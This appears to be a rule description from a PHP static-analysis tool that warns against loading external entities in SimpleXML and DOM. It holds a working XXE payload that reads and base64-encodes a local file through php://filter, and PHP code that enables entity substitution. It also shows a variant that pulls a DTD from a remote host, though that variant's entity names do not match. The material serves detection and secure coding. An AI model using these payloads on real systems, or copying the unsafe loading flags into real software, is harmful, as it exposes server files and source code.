name = "No Net For Xml Load";
description = "Simplexml and ext/DOM load all external entities from the web, by default. This is dangerous, in particular when loading unknown XML code.

Look at this XML code below : it is valid. It defines an entity ``xxe``, that is filled with a file, read on the system and base64 encoded. 

<?literal

&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"&gt; ]&gt;
<replace>&xxe;</replace>

?>

This file could be processed with the following code : note, you can replace 'index.php' in the above entity by any valid filepath. 

<?php 
    $dom = new DOMDocument();
    $dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
    $info = simplexml_import_dom($dom);
    
    print base64_decode($info[0]);
?> 

Here, PHP tries to load the XML file, finds the entity, then solves the entity by encoding a file called ``index.php``. The source code of the file is not used as data in the XML file. 

At that point, the example illustrates how a XXE works : by using the XML engine to load external resources, and preprocessing the XML code. in fact, there is only one change to make this XML code arbitrarily injected : 

<?literal

&lt;!DOCTYPE replace [&lt;!ENTITY writer SYSTEM "https://www.example.com/entities.dtd"&gt; ]&gt;
<replace>&xxe;</replace>

?>

With the above example, the XML code is static (as, it never changes), but the 'xxe' definitions are loaded from a remove website, and are completely under the attacker control.
